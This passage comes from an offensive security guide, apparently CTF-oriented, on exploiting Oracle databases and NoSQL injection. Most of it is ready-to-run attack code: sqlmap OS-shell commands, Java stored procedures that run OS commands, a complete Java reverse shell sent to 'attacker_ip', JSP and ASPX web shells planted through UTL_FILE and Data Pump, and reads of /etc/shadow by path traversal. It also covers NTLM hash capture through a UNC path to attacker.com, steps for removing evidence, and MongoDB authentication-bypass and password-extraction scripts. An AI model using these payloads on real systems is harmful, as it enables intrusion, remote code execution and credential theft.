sqlmap -u "http://target.com/page?id=1" --dbms=oracle -D SYSTEM -T USERS --dump

# OS command execution attempt (requires DBA privileges)
sqlmap -u "http://target.com/page?id=1" --dbms=oracle --os-shell

# Time-based blind with increased delay
sqlmap -u "http://target.com/page?id=1" --dbms=oracle --technique=T --time-sec=10

# Specific tamper scripts for Oracle
sqlmap -u "http://target.com/page?id=1" --dbms=oracle --tamper=space2comment
```

**Common Oracle System Tables for Enumeration**

```sql
-- User information
all_users, dba_users, user_users

-- Table information
all_tables, dba_tables, user_tables

-- Column information
all_tab_columns, dba_tab_columns, user_tab_columns

-- Privilege information
session_privs, user_sys_privs, user_tab_privs, dba_sys_privs

-- Version and instance info
v$version, v$instance, v$database

-- Password hashes (requires DBA)
sys.user$, dba_users (PASSWORD column in older versions)
```

**Bypassing Filters**

```sql
-- Case variation (Oracle is case-insensitive by default)
SeLeCt * FrOm users

-- Comment insertion
SEL/*comment*/ECT * FR/**/OM users

-- Alternative keywords
SELECT * FROM users WHERE username LIKE 'admin'  -- Instead of =
SELECT * FROM users WHERE username IN ('admin')

-- Using CHR() to avoid quotes
SELECT * FROM users WHERE username=CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110)  -- 'admin'

-- Whitespace alternatives
SELECT/**/username/**/FROM/**/users
SELECT+username+FROM+users
SELECT%09username%09FROM%09users  -- Tab character
```

---

### Java code execution

Oracle databases can execute Java stored procedures through embedded JVM functionality, providing a pathway to operating system command execution when sufficient privileges are available.

**Prerequisites for Java Execution**

- `CREATE PROCEDURE` or `CREATE ANY PROCEDURE` privilege
- `JAVASYSPRIV` or `JAVA_ADMIN` role (for Java operations)
- [Inference] Typically requires DBA privileges or specific grants for practical exploitation

**Checking Java Privileges**

```sql
-- Check if JAVASYSPRIV is granted
SELECT * FROM session_privs WHERE privilege LIKE '%JAVA%';

-- Check for JAVA_ADMIN role
SELECT * FROM user_role_privs WHERE granted_role = 'JAVA_ADMIN';

-- Check CREATE PROCEDURE privilege
SELECT * FROM session_privs WHERE privilege LIKE '%PROCEDURE%';

-- List existing Java sources
SELECT object_name, object_type FROM user_objects WHERE object_type = 'JAVA SOURCE';
```

**Creating Java-based Command Execution**

```sql
-- Create Java source for OS command execution
CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "OSCommand" AS
import java.io.*;
public class OSCommand {
    public static String execCommand(String cmd) {
        try {
            StringBuffer output = new StringBuffer();
            Process p = Runtime.getRuntime().exec(cmd);
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line + "\n");
            }
            return output.toString();
        } catch (Exception e) {
            return e.toString();
        }
    }
};
/

-- Create PL/SQL wrapper function
CREATE OR REPLACE FUNCTION execCmd(cmd IN VARCHAR2) RETURN VARCHAR2 AS
LANGUAGE JAVA NAME 'OSCommand.execCommand(java.lang.String) return java.lang.String';
/

-- Execute command
SELECT execCmd('whoami') FROM dual;
SELECT execCmd('id') FROM dual;
SELECT execCmd('/bin/cat /etc/passwd') FROM dual;
```

**Alternative Java Execution Methods**

```sql
-- Java file write capability
CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "FileWrite" AS
import java.io.*;
public class FileWrite {
    public static int writeFile(String filename, String content) {
        try {
            FileWriter fw = new FileWriter(filename);
            fw.write(content);
            fw.close();
            return 1;
        } catch (Exception e) {
            return 0;
        }
    }
};
/

CREATE OR REPLACE FUNCTION write_file(p_file IN VARCHAR2, p_text IN VARCHAR2) RETURN NUMBER AS
LANGUAGE JAVA NAME 'FileWrite.writeFile(java.lang.String, java.lang.String) return int';
/

-- Usage: Write web shell or SSH key
SELECT write_file('/tmp/shell.jsp', '<%@ page import="java.io.*" %><% String cmd = request.getParameter("cmd"); Process p = Runtime.getRuntime().exec(cmd); %>') FROM dual;
```

**Using DBMS_JAVA for Execution**

```sql
-- Alternative using DBMS_JAVA (requires JAVASYSPRIV)
EXEC DBMS_JAVA.grant_permission('SCOTT', 'SYS:java.io.FilePermission', '<<ALL FILES>>', 'execute');
EXEC DBMS_JAVA.grant_permission('SCOTT', 'SYS:java.lang.RuntimePermission', 'writeFileDescriptor', '');
EXEC DBMS_JAVA.grant_permission('SCOTT', 'SYS:java.lang.RuntimePermission', 'readFileDescriptor', '');
```

**Java Reverse Shell**

```sql
-- Create Java reverse shell class
CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "RevShell" AS
import java.io.*;
import java.net.*;
public class RevShell {
    public static void connect(String host, int port) {
        try {
            Socket s = new Socket(host, port);
            Process p = Runtime.getRuntime().exec("/bin/bash");
            InputStream pi = p.getInputStream();
            InputStream pe = p.getErrorStream();
            InputStream si = s.getInputStream();
            OutputStream po = p.getOutputStream();
            OutputStream so = s.getOutputStream();
            while (!s.isClosed()) {
                while (pi.available() > 0) so.write(pi.read());
                while (pe.available() > 0) so.write(pe.read());
                while (si.available() > 0) po.write(si.read());
                so.flush();
                po.flush();
                Thread.sleep(50);
                try {
                    p.exitValue();
                    break;
                } catch (Exception e) {}
            }
        } catch (Exception e) {}
    }
};
/

CREATE OR REPLACE PROCEDURE revshell(p_host IN VARCHAR2, p_port IN NUMBER) AS
LANGUAGE JAVA NAME 'RevShell.connect(java.lang.String, int)';
/

-- Execute reverse shell (listener on attacker machine)
EXEC revshell('attacker_ip', 4444);
```

**Listener Setup (Attacker Machine)**

```bash
# Netcat listener
nc -lvnp 4444

# Metasploit handler
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD java/shell_reverse_tcp; set LHOST attacker_ip; set LPORT 4444; exploit"
```

**Using ODAT for Java Exploitation**

```bash
# Execute OS command via Java
odat java -s <target_ip> -p 1521 -d XE -U SYSTEM -P MANAGER --sysdba --exec "id"

# Upload and execute Java payload
odat java -s <target_ip> -p 1521 -d XE -U SYSTEM -P MANAGER --sysdba --exec-shell

# Check Java permissions
odat java -s <target_ip> -p 1521 -d XE -U SYSTEM -P MANAGER --test-module
```

**Metasploit Java Exploitation**

```bash
# Using oracle_java_exec module
use exploit/multi/http/oracle_java_exec
set RHOST <target_ip>
set RPORT 1521
set SID XE
set USERNAME SYSTEM
set PASSWORD MANAGER
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST <attacker_ip>
run
```

**Privilege Requirements and Limitations**

```sql
-- Grant necessary privileges (if you have DBA access)
GRANT JAVAUSERPRIV TO username;
GRANT JAVASYSPRIV TO username;
GRANT CREATE PROCEDURE TO username;

-- Check Java policy grants
SELECT * FROM dba_java_policy WHERE grantee = 'USERNAME';

-- List Java-related roles
SELECT * FROM dba_roles WHERE role LIKE '%JAVA%';
```

**Cleanup After Exploitation**

```sql
-- Remove Java source
DROP JAVA SOURCE "OSCommand";
DROP JAVA SOURCE "RevShell";
DROP JAVA SOURCE "FileWrite";

-- Remove wrapper functions/procedures
DROP FUNCTION execCmd;
DROP PROCEDURE revshell;
DROP FUNCTION write_file;
```

**Common Issues and Troubleshooting**

- **Permission Denied**: Insufficient Java privileges, grant `JAVASYSPRIV` or `JAVA_ADMIN`
- **Class Not Found**: Java source not compiled, ensure `RESOLVE` keyword is used
- **Network Restrictions**: Oracle may block outbound connections via Java Security Manager
- **SELinux/AppArmor**: On Linux, additional OS-level restrictions may prevent command execution
- [Unverified] Some managed Oracle environments disable Java execution entirely

**Alternative Command Execution Methods (Non-Java)**

If Java execution fails, consider these alternatives:

```sql
-- Using UTL_FILE (requires directory object and permissions)
-- Using external tables with preprocessor
-- Using DBMS_SCHEDULER with executable jobs (requires CREATE JOB privilege)
-- Using Oracle XML DB (if installed)
```

---

**Related Important Topics for Further Study:**

- **PL/SQL Injection**: Exploiting stored procedures and functions
- **Oracle TNS Poisoning**: Man-in-the-middle attacks on Oracle listener
- **Privilege Escalation**: Techniques to escalate from limited user to DBA
- **Oracle Password Hash Cracking**: Extracting and cracking Oracle password hashes (DES/SHA1)
- **DBMS_SCHEDULER Abuse**: Using scheduled jobs for persistence and execution
- **External Table Exploitation**: Leveraging external tables for file system access

---

### External Table Exploitation

External tables in Oracle allow the database to query data stored in external files as if they were regular database tables. This feature becomes a security vulnerability when attackers can create or manipulate external tables to read arbitrary files from the server filesystem or execute code.

**Fundamental Concept**

External tables use directory objects (pointers to filesystem paths) and access drivers (ORACLE_LOADER for reading, ORACLE_DATAPUMP for reading/writing). The key vulnerability occurs when:

- A user has CREATE ANY TABLE or CREATE TABLE privileges
- Directory objects exist with READ/WRITE permissions
- The Oracle process has filesystem access to sensitive locations

**Prerequisite Enumeration**

Before exploitation, identify available directories and privileges:

```sql
-- Check current user's directory privileges
SELECT * FROM user_tab_privs WHERE table_name IN (SELECT directory_name FROM all_directories);

-- List all accessible directories
SELECT * FROM all_directories;

-- Check for CREATE TABLE privileges
SELECT * FROM user_sys_privs WHERE privilege LIKE '%TABLE%';
SELECT * FROM user_tab_privs WHERE privilege = 'READ' OR privilege = 'WRITE';
```

**File Read Exploitation**

Once you identify a readable directory, create an external table pointing to a target file:

```sql
-- Create external table to read /etc/passwd (Linux)
CREATE TABLE external_file_read (
    line VARCHAR2(4000)
)
ORGANIZATION EXTERNAL (
    TYPE ORACLE_LOADER
    DEFAULT DIRECTORY DATA_DIR
    ACCESS PARAMETERS (
        RECORDS DELIMITED BY NEWLINE
        FIELDS TERMINATED BY ','
        MISSING FIELD VALUES ARE NULL
    )
    LOCATION ('../../../../etc/passwd')
)
REJECT LIMIT UNLIMITED;

-- Query the external table to retrieve file contents
SELECT * FROM external_file_read;
```

**Windows-Specific Considerations**

On Windows systems, path traversal syntax differs:

```sql
-- Windows file read example
CREATE TABLE win_file_read (
    line VARCHAR2(4000)
)
ORGANIZATION EXTERNAL (
    TYPE ORACLE_LOADER
    DEFAULT DIRECTORY DATA_DIR
    ACCESS PARAMETERS (
        RECORDS DELIMITED BY NEWLINE
    )
    LOCATION ('..\..\..\..\Windows\System32\drivers\etc\hosts')
);
```

**File Write/Code Execution via Preprocessor**

[Inference] The PREPROCESSOR clause (available in Oracle 11g+) allows execution of operating system commands before loading data. This can be leveraged for command execution:

```sql
-- Linux command execution
CREATE TABLE preprocess_exec (
    output VARCHAR2(4000)
)
ORGANIZATION EXTERNAL (
    TYPE ORACLE_LOADER
    DEFAULT DIRECTORY DATA_DIR
    ACCESS PARAMETERS (
        RECORDS DELIMITED BY NEWLINE
        PREPROCESSOR DATA_DIR:'reverse_shell.sh'
    )
    LOCATION ('dummy.txt')
);

-- Trigger execution by querying
SELECT * FROM preprocess_exec;
```

For Windows:

```sql
-- Windows command execution
CREATE TABLE preprocess_win (
    output VARCHAR2(4000)
)
ORGANIZATION EXTERNAL (
    TYPE ORACLE_LOADER
    DEFAULT DIRECTORY DATA_DIR
    ACCESS PARAMETERS (
        PREPROCESSOR DATA_DIR:'payload.bat'
    )
    LOCATION ('dummy.txt')
);
```

**ORACLE_DATAPUMP Driver for Writing**

The ORACLE_DATAPUMP driver enables file creation on the target system:

```sql
-- Write arbitrary content to file
CREATE TABLE datapump_write (
    cmd VARCHAR2(4000)
)
ORGANIZATION EXTERNAL (
    TYPE ORACLE_DATAPUMP
    DEFAULT DIRECTORY DATA_DIR
    LOCATION ('shell.jsp')
);

-- Insert webshell content
INSERT INTO datapump_write VALUES ('<%@ page import="java.io.*" %><%String cmd=request.getParameter("cmd");Process p=Runtime.getRuntime().exec(cmd);%>');
```

**Cleanup and Evasion**

```sql
-- Remove evidence
DROP TABLE external_file_read;
DROP TABLE preprocess_exec;
```

### UTL_FILE Exploitation

The `UTL_FILE` PL/SQL package provides file I/O operations for Oracle databases. When users have EXECUTE privileges on this package combined with directory access, it enables arbitrary file read/write operations.

**Package Overview**

UTL_FILE provides procedures and functions including:

- `FOPEN` - Opens a file for read/write
- `GET_LINE` - Reads a line from file
- `PUT_LINE` - Writes a line to file
- `FCLOSE` - Closes file handle

**Privilege Enumeration**

```sql
-- Check UTL_FILE execute privileges
SELECT * FROM user_sys_privs WHERE privilege = 'EXECUTE ANY PROCEDURE';
SELECT * FROM user_tab_privs WHERE table_name = 'UTL_FILE';

-- Verify directory access
SELECT * FROM all_directories WHERE directory_name = 'DATA_DIR';
```

**File Read Operations**

```sql
-- PL/SQL block to read sensitive files
DECLARE
    file_handle UTL_FILE.FILE_TYPE;
    line_buffer VARCHAR2(32767);
BEGIN
    -- Open target file (Linux)
    file_handle := UTL_FILE.FOPEN('DATA_DIR', '../../../../etc/shadow', 'R');
    
    -- Read and output lines
    LOOP
        BEGIN
            UTL_FILE.GET_LINE(file_handle, line_buffer);
            DBMS_OUTPUT.PUT_LINE(line_buffer);
        EXCEPTION
            WHEN NO_DATA_FOUND THEN
                EXIT;
        END;
    END LOOP;
    
    UTL_FILE.FCLOSE(file_handle);
EXCEPTION
    WHEN OTHERS THEN
        DBMS_OUTPUT.PUT_LINE('Error: ' || SQLERRM);
        IF UTL_FILE.IS_OPEN(file_handle) THEN
            UTL_FILE.FCLOSE(file_handle);
        END IF;
END;
/
```

**File Write Operations**

```sql
-- Write webshell to accessible web directory
DECLARE
    file_handle UTL_FILE.FILE_TYPE;
BEGIN
    -- Open file for writing
    file_handle := UTL_FILE.FOPEN('WEB_DIR', 'shell.jsp', 'W');
    
    -- Write webshell payload
    UTL_FILE.PUT_LINE(file_handle, '<%@ page import="java.io.*" %>');
    UTL_FILE.PUT_LINE(file_handle, '<%');
    UTL_FILE.PUT_LINE(file_handle, 'String cmd = request.getParameter("cmd");');
    UTL_FILE.PUT_LINE(file_handle, 'Process p = Runtime.getRuntime().exec(cmd);');
    UTL_FILE.PUT_LINE(file_handle, 'BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));');
    UTL_FILE.PUT_LINE(file_handle, 'String line; while((line=br.readLine())!=null) { out.println(line); }');
    UTL_FILE.PUT_LINE(file_handle, '%>');
    
    UTL_FILE.FCLOSE(file_handle);
    DBMS_OUTPUT.PUT_LINE('Webshell written successfully');
EXCEPTION
    WHEN OTHERS THEN
        DBMS_OUTPUT.PUT_LINE('Error: ' || SQLERRM);
END;
/
```

**Windows Path Considerations**

On Windows, use backslash escaping:

```sql
DECLARE
    file_handle UTL_FILE.FILE_TYPE;
BEGIN
    -- Windows file write
    file_handle := UTL_FILE.FOPEN('TEMP_DIR', '..\\..\\..\\inetpub\\wwwroot\\cmd.aspx', 'W');
    UTL_FILE.PUT_LINE(file_handle, '<%@ Page Language="C#" %>');
    UTL_FILE.PUT_LINE(file_handle, '<%@ Import Namespace="System.Diagnostics" %>');
    -- Additional ASPX webshell content
    UTL_FILE.FCLOSE(file_handle);
END;
/
```

**SQL Injection Context Exploitation**

When exploiting via SQL injection, use inline PL/SQL:

```sql
-- Inline file read via injection
' || (SELECT UTL_FILE.GET_LINE(UTL_FILE.FOPEN('DIR','../../../../etc/passwd','R'),NULL) FROM DUAL) || '

-- Alternative single-line approach
'; DECLARE f UTL_FILE.FILE_TYPE; l VARCHAR2(32767); BEGIN f:=UTL_FILE.FOPEN('DIR','../../file.txt','R'); UTL_FILE.GET_LINE(f,l); INSERT INTO output_table VALUES(l); UTL_FILE.FCLOSE(f); END; --
```

**Error-Based Information Disclosure**

UTL_FILE operations generate verbose error messages that leak filesystem information:

```sql
-- Intentionally trigger errors to enumerate paths
DECLARE
    f UTL_FILE.FILE_TYPE;
BEGIN
    f := UTL_FILE.FOPEN('INVALID_DIR', 'test.txt', 'R');
EXCEPTION
    WHEN OTHERS THEN
        DBMS_OUTPUT.PUT_LINE(SQLERRM);  -- Reveals actual filesystem paths
END;
/
```

**Limitations and Constraints**

- UTL_FILE operations are constrained by Oracle process filesystem permissions
- Maximum file handle limit (default 50, set by `MAX_OPEN_FILES` parameter)
- Line length limitations (32,767 bytes for GET_LINE)
- Directory paths must be explicitly defined in database

### Directory Privileges Abuse

Oracle directory objects are logical pointers to physical filesystem locations. Misconfigured directory privileges enable attackers to escalate access by reading/writing files outside intended boundaries or leveraging them with other packages like UTL_FILE and external tables.

**Directory Object Architecture**

Directory objects map a database-level name to an OS-level path:

```sql
-- Syntax
CREATE DIRECTORY directory_name AS '/physical/filesystem/path';
```

Privileges on directories:

- `READ` - Allows reading files in the directory
- `WRITE` - Allows writing files to the directory

**Enumeration Techniques**

```sql
-- List all directories visible to current user
SELECT directory_name, directory_path FROM all_directories ORDER BY directory_name;

-- Identify directories with granted privileges
SELECT grantee, table_name AS directory_name, privilege 
FROM dba_tab_privs 
WHERE table_name IN (SELECT directory_name FROM dba_directories)
ORDER BY grantee, table_name;

-- Check specific directory privileges for current user
SELECT privilege, directory_name 
FROM user_tab_privs 
WHERE table_name IN (SELECT directory_name FROM all_directories);

-- Find publicly accessible directories
SELECT directory_name, directory_path 
FROM dba_directories 
WHERE directory_name IN (
    SELECT table_name FROM dba_tab_privs WHERE grantee = 'PUBLIC'
);
```

**Common Vulnerable Directories**

[Inference] Default Oracle installations often include directories that may be overprivileged:

```sql
-- Common directories to check
DATA_PUMP_DIR    -- Default directory for data pump operations
ORACLE_OCM_CONFIG_DIR  -- Oracle Configuration Manager
ORACLE_BASE      -- Oracle installation base
XMLDIR          -- XML processing directory
ADMIN_DIR       -- Administrative files
```

Query for these:

```sql
SELECT directory_name, directory_path 
FROM all_directories 
WHERE directory_name LIKE '%PUMP%' 
   OR directory_name LIKE '%ADMIN%' 
   OR directory_name LIKE '%DATA%';
```

**Privilege Escalation via Directory Creation**

If you have `CREATE ANY DIRECTORY` privilege:

```sql
-- Check for privilege
SELECT * FROM user_sys_privs WHERE privilege = 'CREATE ANY DIRECTORY';

-- Create directory pointing to sensitive locations (Linux)
CREATE DIRECTORY sensitive_dir AS '/etc';
CREATE DIRECTORY root_dir AS '/root';
CREATE DIRECTORY web_dir AS '/var/www/html';

-- Windows equivalents
CREATE DIRECTORY win_sys AS 'C:\Windows\System32';
CREATE DIRECTORY win_web AS 'C:\inetpub\wwwroot';

-- Grant yourself privileges
GRANT READ, WRITE ON DIRECTORY sensitive_dir TO current_user;
```

**Path Traversal via Directory Paths**

Even without CREATE privileges, existing directories with broad paths can be exploited:

```sql
-- If directory points to /tmp, traverse upward
SELECT directory_path FROM all_directories WHERE directory_name = 'TMP_DIR';
-- Result: /tmp

-- Use with external tables or UTL_FILE
CREATE TABLE traverse_read (line VARCHAR2(4000))
ORGANIZATION EXTERNAL (
    TYPE ORACLE_LOADER
    DEFAULT DIRECTORY TMP_DIR
    ACCESS PARAMETERS (RECORDS DELIMITED BY NEWLINE)
    LOCATION ('../etc/passwd')  -- Traverse from /tmp to /etc
);
```

**Abuse via DATA_PUMP_DIR**

The `DATA_PUMP_DIR` directory is particularly valuable as it's often writable and used by DBMS_DATAPUMP:

```sql
-- Verify access
SELECT directory_path FROM all_directories WHERE directory_name = 'DATA_PUMP_DIR';

-- Write SQL file via data pump
DECLARE
    h1 NUMBER;
BEGIN
    h1 := DBMS_DATAPUMP.OPEN(
        operation => 'EXPORT',
        job_mode => 'SCHEMA',
        job_name => 'EXPLOIT_JOB'
    );
    
    DBMS_DATAPUMP.ADD_FILE(
        handle => h1,
        filename => 'shell.sql',
        directory => 'DATA_PUMP_DIR',
        filetype => DBMS_DATAPUMP.KU$_FILE_TYPE_LOG_FILE
    );
    
    DBMS_DATAPUMP.START_JOB(h1);
    DBMS_DATAPUMP.DETACH(h1);
END;
/
```

**Windows UNC Path Injection**

[Unverified] On Windows, directory objects may accept UNC paths, potentially enabling NTLM hash capture:

```sql
-- Attempt to create directory with UNC path
CREATE DIRECTORY unc_dir AS '\\attacker.com\share';

-- Force Oracle to authenticate to attacker-controlled server
DECLARE
    f UTL_FILE.FILE_TYPE;
BEGIN
    f := UTL_FILE.FOPEN('unc_dir', 'test.txt', 'W');
    UTL_FILE.FCLOSE(f);
END;
/
```

**This technique's behavior depends on Oracle version and Windows configuration. The Oracle process's NTLM hash may be captured via SMB relay tools like Responder.**

**Combining with Java Stored Procedures**

If Java stored procedures are enabled, directories can be leveraged for code execution:

```sql
-- Check for Java privileges
SELECT * FROM user_sys_privs WHERE privilege LIKE '%JAVA%';

-- Write malicious Java class to directory, then load it
CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "ShellExec" AS
import java.io.*;
public class ShellExec {
    public static String run(String cmd) throws IOException {
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
        StringBuilder sb = new StringBuilder();
        String line;
        while ((line = br.readLine()) != null) {
            sb.append(line).append("\n");
        }
        return sb.toString();
    }
}
/

-- Create PL/SQL wrapper
CREATE OR REPLACE FUNCTION java_exec(cmd VARCHAR2) RETURN VARCHAR2
AS LANGUAGE JAVA NAME 'ShellExec.run(java.lang.String) return java.lang.String';
/

-- Execute commands
SELECT java_exec('whoami') FROM dual;
SELECT java_exec('id') FROM dual;
```

**Defense Detection and Cleanup**

```sql
-- Audit directory access
SELECT username, timestamp, obj_name, action_name 
FROM dba_audit_trail 
WHERE obj_name IN (SELECT directory_name FROM dba_directories)
ORDER BY timestamp DESC;

-- Remove malicious directories
DROP DIRECTORY sensitive_dir;
DROP DIRECTORY root_dir;

-- Revoke excessive privileges
REVOKE READ, WRITE ON DIRECTORY data_pump_dir FROM public;
```

**CTF-Specific Enumeration Script**

For rapid assessment during CTF scenarios:

```sql
-- Comprehensive directory privilege dump
SELECT 
    d.directory_name,
    d.directory_path,
    p.grantee,
    p.privilege,
    CASE 
        WHEN p.privilege = 'WRITE' THEN 'HIGH'
        WHEN p.privilege = 'READ' THEN 'MEDIUM'
        ELSE 'LOW'
    END as risk_level
FROM 
    all_directories d
    LEFT JOIN dba_tab_privs p ON d.directory_name = p.table_name
WHERE 
    p.grantee IN (USER, 'PUBLIC')
    OR p.grantee IN (SELECT granted_role FROM user_role_privs)
ORDER BY 
    risk_level DESC, directory_name;
```

---

**Important Related Techniques:**

For complete Oracle database exploitation coverage, explore these complementary topics:

- **PL/SQL Injection** - Exploiting stored procedures and dynamic SQL
- **DBMS_SCHEDULER Abuse** - Job scheduling for persistence and privilege escalation
- **Oracle TNS Poisoning** - Network-level attacks against Oracle listeners
- **ODAT (Oracle Database Attacking Tool)** - Automated Oracle exploitation framework usage

---

## NoSQL Injection

NoSQL databases (MongoDB, CouchDB, Redis, Cassandra) use different query structures than SQL databases, often accepting JSON, XML, or key-value pairs instead of SQL syntax. This creates unique injection vulnerabilities when user input is improperly validated before being incorporated into NoSQL queries.

### MongoDB Injection Fundamentals

MongoDB uses BSON (Binary JSON) for data storage and accepts queries as JSON-like structures. Query operators begin with `$` and enable comparison, logical, and evaluation operations.

**Common MongoDB Query Operators:**

```bash
$eq   # Equal to
$ne   # Not equal to
$gt   # Greater than
$gte  # Greater than or equal
$lt   # Less than
$lte  # Less than or equal
$in   # Matches any value in array
$nin  # Matches none in array
$regex # Regular expression match
$where # JavaScript expression evaluation
$exists # Field existence check
```

**Basic Injection Example:**

Normal login query in MongoDB:

```javascript
db.users.find({username: 'admin', password: 'password123'})
```

If application constructs query from POST parameters without validation:

```javascript
// Vulnerable code
db.users.find({
  username: req.body.username,
  password: req.body.password
})
```

**Authentication Bypass Using `$ne` (Not Equal):**

POST request payload:

```json
{
  "username": {"$ne": ""},
  "password": {"$ne": ""}
}
```

This transforms the query to:

```javascript
db.users.find({username: {$ne: ""}, password: {$ne: ""}})
```

Returns any document where username and password are not empty strings, effectively bypassing authentication.

**URL-Encoded Format:**

```
username[$ne]=&password[$ne]=
```

**Alternative Operators for Bypass:**

```json
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"username": {"$exists": true}, "password": {"$exists": true}}
```

### `$where` Operator Exploitation

The `$where` operator accepts JavaScript expressions and evaluates them against each document. This is particularly dangerous as it enables arbitrary JavaScript execution in the database context.

**Identifying `$where` Vulnerabilities:**

Applications using `$where` for complex queries:

```javascript
db.products.find({$where: "this.price < 100"})
```

**Boolean-Based Injection:**

Test for `$where` injection with sleep payloads:

```javascript
' || sleep(5000) || '
' || this.username == 'admin' || '
```

**Data Extraction via `$where`:**

Extract password length:

```javascript
' || this.password.length == 8 || '
```

Character-by-character extraction:

```javascript
' || this.password[0] == 'a' || '
' || this.password.substring(0,1) == 'a' || '
```

**Command Execution Attempts** [Inference - depends on MongoDB configuration and version]:

Older MongoDB versions or specific configurations may allow:

```javascript
'; var cmd = 'ls'; var result = run(cmd); '
```

**Practical `$where` Injection Payload:**

URL parameter:

```
?search='%20%7C%7C%20sleep(5000)%20%7C%7C%20'
```

POST body:

```json
{
  "search": {
    "$where": "sleep(5000)"
  }
}
```

**Blind `$where` Injection for Data Enumeration:**

```python
# Python script to extract data character by character
import requests
import string

url = "http://target.com/api/search"
charset = string.printable
password = ""

for position in range(1, 20):
    for char in charset:
        payload = {
            "search": {
                "$where": f"this.password.substring({position-1},{position}) == '{char}'"
            }
        }
        response = requests.post(url, json=payload)
        if "found" in response.text:  # Adjust condition based on response
            password += char
            print(f"[+] Found character: {char}")
            break
    else:
        break

print(f"[+] Extracted password: {password}")
```

### `$gt` Operator Exploitation

The "greater than" operator can be used for authentication bypass and data enumeration.

**Authentication Bypass:**

```json
{
  "username": "admin",
  "password": {"$gt": ""}
}
```

**Data Extraction Using `$gt` with Binary Search:**

Extract password by comparing values:

```python
# Binary search approach for password extraction
def extract_password(url, username):
    password = ""
    while True:
        found_char = False
        for char_code in range(32, 127):
            char = chr(char_code)
            payload = {
                "username": username,
                "password": {"$gt": password + char}
            }
            # Send payload and check response
            if successful_login(url, payload):
                # Character is less than or equal to current
                continue
            else:
                # Previous character was the match
                password += chr(char_code - 1)
                found_char = True
                break
        
        if not found_char:
            break
    
    return password
```

**Combining Operators:**

```json
{
  "username": "admin",
  "password": {
    "$gte": "a",
    "$lte": "z"
  }
}
```

### NoSQL Injection Automation with NoSQLMap

NoSQLMap is a Python tool designed to automate NoSQL injection exploitation, particularly for MongoDB, CouchDB, and other NoSQL databases.

**Installation:**

```bash
git clone https://github.com/codingo/NoSQLMap.git
cd NoSQLMap
pip install -r requirements.txt
python nosqlmap.py
```

**Basic Usage:**

```bash
# Interactive mode
python nosqlmap.py

# Command-line mode with target URL
python nosqlmap.py -t http://target.com/login -p "username,password"

# Specify injection point
python nosqlmap.py -u http://target.com/api/search?q=INJECT

# POST request injection
python nosqlmap.py -u http://target.com/login -p "username,password" \
  --method POST --data '{"username":"INJECT","password":"INJECT"}'
```

**Attack Vectors in NoSQLMap:**

```bash
# Authentication bypass attempts
python nosqlmap.py -t http://target.com/login -p "username,password" \
  --attack-type 1

# JavaScript injection via $where
python nosqlmap.py -t http://target.com/search -p "query" \
  --attack-type 2

# Time-based blind injection
python nosqlmap.py -t http://target.com/api -p "id" \
  --attack-type 3 --timeout 5

# Extract data using blind techniques
python nosqlmap.py -t http://target.com/api -p "id" \
  --attack-type 4 --extract database.collection.field
```

**Configuration Options:**

```bash
# Custom headers
python nosqlmap.py -u http://target.com/api \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json"

# Cookies
python nosqlmap.py -u http://target.com/api \
  --cookie "session=abc123; token=xyz"

# Proxy through Burp Suite
python nosqlmap.py -u http://target.com/api \
  --proxy http://127.0.0.1:8080

# Verbose output for debugging
python nosqlmap.py -u http://target.com/api -v
```

[Unverified - Tool capabilities depend on version and target implementation]: NoSQLMap's effectiveness varies based on application architecture, input filtering, and NoSQL database version. Always manually verify automated findings.

### JSON Injection

JSON injection occurs when user-controlled input is embedded into JSON structures without proper encoding or validation.

**Identifying JSON Injection Points:**

Applications accepting JSON input:

```http
POST /api/user HTTP/1.1
Content-Type: application/json

{"username": "test", "role": "user"}
```

**Basic JSON Injection Techniques:**

**1. Object Injection - Adding Fields:**

Original request:

```json
{"username": "attacker"}
```

Injected payload:

```json
{"username": "attacker", "role": "admin"}
```

If application doesn't whitelist allowed fields, additional properties may be processed.

**2. Array Injection:**

Original:

```json
{"items": ["item1", "item2"]}
```

Injected:

```json
{"items": ["item1", "item2"], "discount": 100}
```

**3. Type Confusion:**

Change data types to bypass validation:

```json
// Original expects string
{"userId": "123"}

// Inject object with operators
{"userId": {"$ne": null}}
```

**4. Breaking JSON Structure:**

Inject to close current object and add new fields:

```json
// Application constructs: {"search": "USER_INPUT", "limit": 10}
// Inject: test", "role": "admin", "x": "
// Result: {"search": "test", "role": "admin", "x": "", "limit": 10}
```

**Practical JSON Injection Payloads:**

**Authentication Bypass:**

```json
{
  "username": {"$ne": null},
  "password": {"$ne": null}
}
```

**Parameter Pollution:**

```json
{
  "email": "attacker@evil.com",
  "email": "admin@target.com"
}
```

[Inference]: Behavior depends on JSON parser - some use first occurrence, others use last.

**SQL Injection via JSON:**

When JSON data is parsed and inserted into SQL queries:

```json
{
  "username": "admin' OR '1'='1",
  "comment": "normal comment"
}
```

**Command Injection via JSON:**

```json
{
  "filename": "document.pdf; cat /etc/passwd"
}
```

**Testing JSON Endpoints:**

```bash
# Burp Suite Repeater - modify JSON payloads
# Test each field individually

# Using curl
curl -X POST http://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":""},"password":{"$ne":""}}'

# Using jq to manipulate JSON
echo '{"user":"test"}' | jq '.role = "admin"'

# Python script for automated testing
import requests
import json

payloads = [
    {"$ne": ""},
    {"$gt": ""},
    {"$regex": ".*"},
    "admin' OR '1'='1",
]

for payload in payloads:
    data = {"username": payload, "password": payload}
    response = requests.post("http://target.com/api/login", 
                           json=data)
    print(f"Payload: {payload}")
    print(f"Status: {response.status_code}")
    print(f"Response: {response.text[:100]}\n")
```

### JavaScript Injection in NoSQL

JavaScript injection in NoSQL databases occurs when user input is incorporated into JavaScript code executed by the database engine, primarily through MongoDB's `$where` operator, `mapReduce()` functions, or `$function` expressions.

